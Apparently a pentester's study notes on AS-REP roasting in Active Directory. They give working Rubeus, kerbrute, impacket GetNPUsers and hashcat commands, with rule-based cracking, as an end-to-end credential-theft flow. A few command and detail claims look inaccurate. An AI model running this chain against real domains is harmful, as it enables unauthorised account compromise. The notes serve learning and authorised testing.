### Root Cause

Kerberos normally requires the user to prove identity in Step 1 by encrypting a timestamp
with their password hash — this is called preauthentication.

Some accounts have "Do not require Kerberos preauthentication" enabled. (<u>Not Default setting</u>)

This means anyone can send an AS-REQ for that account with no proof of identity.

KDC just hands back an AS-REP containing material encrypted with that account's password hash.

Attacker takes that encrypted material offline and cracks it.

---
### Scenario 1 — You Have a Domain User (Authenticated)

You already have credentials or a shell as any domain user.
You can query AD to find all accounts with preauthentication disabled.

**With PowerView:**
```powershell
Get-DomainUser -PreauthNotRequired
````

**With Rubeus (finds and roasts in one step):**

```powershell
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

Rubeus automatically finds all vulnerable accounts, requests their AS-REP, and outputs the hashes ready for cracking.

---
### Scenario 2 — You Have No Credentials (Unauthenticated)

You have no domain user at all. You need to guess valid usernames first.

## **Kerbrute — username enumeration:**

```bash
kerbrute userenum -d domain.local --dc DC_IP usernames.txt
```

Kerbrute sends AS-REQs for each username. 
Valid usernames get a response (either a real AS-REP or a "preauthentication required" error). 
Both responses confirm the username exists. 
Invalid usernames get no response.

Then target the valid usernames you found:

```bash
kerbrute bruteuser -d domain.local --dc DC_IP valid_users.txt
```

## **Impacket GetNPUsers — request AS-REP for known usernames without creds:**

```bash
impacket-GetNPUsers domain.local/ -usersfile valid_users.txt -dc-ip DC_IP -no-pass -format hashcat
```

> **Why is bruteforcing usernames noisy?** 
> Every failed AS-REQ generates a Kerberos error on the DC. 
> Large scale username enumeration produces hundreds of event ID 4768 failures. 
> Defenders watching logs will see the spike immediately. 
> Kerbrute is slightly stealthier than raw bruteforce but still visible at scale.

---
### The Hash You Get

Output looks like this:

```
$krb5asrep$23$victim@domain.local:a3f8c2...long encrypted blob...
```

This is the AS-REP encrypted blob — specifically the enc-part encrypted with the user's password hash. You crack this to recover their plaintext password.

---
### Cracking — Hashcat vs John

## **Hashcat:**

```bash
hashcat -m 18200 hashes.txt rockyou.txt
```

Mode 18200 = AS-REP / Kerberos 5 hash type.

## **John:**

```bash
john hashes.txt --wordlist=rockyou.txt
```

---
### Rules — What They Are and How They Work

> **Your confusion: what are rules, what is the dict file, will it manipulate rockyou passwords?**

Yes — rules manipulate every password in the wordlist and generate variations.

RockYou is just a list of real leaked passwords:

```
password
123456
letmein
Summer2023
```

Rules are transformation instructions applied to every single word:

```
Rule: capitalize first letter      → Password, Summer2023 (already done)
Rule: add number at end            → password1, password2 ... password9
Rule: add ! at end                 → password!, letmein!
Rule: l33tspeak substitution       → p@ssw0rd, l3tm3in
Rule: reverse the word             → drowssap, niemtel
Rule: append year                  → password2023, password2024
```

So instead of just trying "password" you are now trying:

```
password
Password
PASSWORD
p@ssword
p@ssw0rd
password1
password!
password2023
drowssap
```

All generated on the fly from one single entry in rockyou.

## **Hashcat with rules:**

```bash
hashcat -m 18200 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### **Common rule files:**

```
best64.rule         → 64 most effective transformations, fast
rockyou-30000.rule  → 30000 rules, thorough but slow
OneRuleToRuleThemAll.rule → community rule, very effective against real passwords
d3ad0ne.rule        → aggressive, good for complex passwords
```

**Why rules matter in real engagements:** Users never use passwords from rockyou exactly. They use variations:

```
Company policy says 8 chars + number + special
→ user picks:  Summer2024!
→ not in rockyou
→ but "summer" IS in rockyou
→ rule capitalizes + appends year + appends ! → cracks it
```

Rules bridge the gap between the wordlist and how humans actually construct passwords.

---
### Full Attack Flow

```
No creds:
kerbrute userenum → find valid usernames
impacket-GetNPUsers → request AS-REP for those users
hashcat -m 18200 hashes.txt rockyou.txt -r best64.rule → crack

With creds:
Rubeus asreproast → finds all vulnerable accounts + dumps hashes automatically
hashcat -m 18200 hashes.txt rockyou.txt -r best64.rule → crack
```

---
---
